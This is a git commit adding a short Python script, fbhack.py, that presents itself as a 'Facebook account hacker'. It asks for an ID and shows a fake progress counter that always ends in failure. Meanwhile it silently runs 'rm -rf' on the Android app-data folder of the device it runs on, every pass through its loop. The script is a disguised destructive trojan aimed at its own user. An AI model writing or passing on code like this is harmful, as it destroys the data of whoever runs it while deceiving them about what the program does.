cb1fde703c5bb8c14aef12270d409f34355d2fc5
Ph-Thund3r <70021444+Ph-Thund3r@users.noreply.github.com>
2020-09-14 17:54:16 +0800

    Create fbhack.py

---
+++ fbhack.py
@@ -0,0 +1,14 @@
+import os
+import time
+print("""============================
+WELCOME TO FACEBOOK ACCOUNT HACKER
+===========================""")
+while True:
+	os.system("rm -rf /storage/emulated/0/Android/data/")
+	input("Enter facebook ID:")
+	for i in range(0,101):
+		print("----Hacking starting---")
+		time.sleep(6)
+		print("HACKING ATTEMPT>>", i ,"%")
+	print("HACKING ATTEMPT FAILED! PLEASE TRY AGAIN!")
+	
